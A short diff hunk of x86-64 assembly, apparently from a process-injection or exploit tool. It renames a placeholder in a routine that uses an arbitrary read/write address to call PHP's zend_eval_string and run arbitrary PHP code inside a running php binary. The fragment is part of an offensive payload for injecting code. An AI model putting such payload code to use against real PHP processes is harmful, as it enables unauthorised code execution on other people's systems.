@@ -39,7 +39,7 @@ execute_php_code_main:
 	mov rax, arbitrary_read_write_data_address[rip]
 	add rax, 128
 	mov rdi, rax
-	mov r10, [FUNCTION_ADDRESS:^zend_eval_string$:IN_BINARY:.+/php($|[0-9\.]+$):FUNCTION_ADDRESS]
+	mov r10, [SYMBOL_ADDRESS:^zend_eval_string$:IN_BINARY:.+/php($|[0-9\.]+$):SYMBOL_ADDRESS]
 	call r10
 	pop rax
 	pop rbx
